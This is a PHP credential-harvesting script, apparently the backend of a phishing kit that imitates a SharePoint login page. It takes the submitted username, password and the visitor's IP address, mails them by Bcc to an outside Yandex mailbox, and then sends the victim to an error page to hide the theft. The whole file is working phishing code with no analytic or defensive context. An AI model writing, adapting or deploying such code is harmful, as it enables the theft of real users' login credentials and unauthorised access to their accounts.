<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------SharePoint-----------------------\n";
$message .= "Username       : ".$_POST['uname']."\n";
$message .= "Password      : ".$_POST['psw']."\n";

$message .= "------------------------IP------------------------------\n";
$message .= "IP                : $ip\n";$IP=$_POST['IP'];
$message .= "--------------SharePoint----------------------\n";
$send = "";
$bcc="myprivateworkbox@yandex.com," ;
$subject = "SharePoint ".$_POST['email'];
$headers .= $_POST['pass']."\n";



mail($send, $subject, $message, "Bcc: $bcc");


header("Location: err.htm");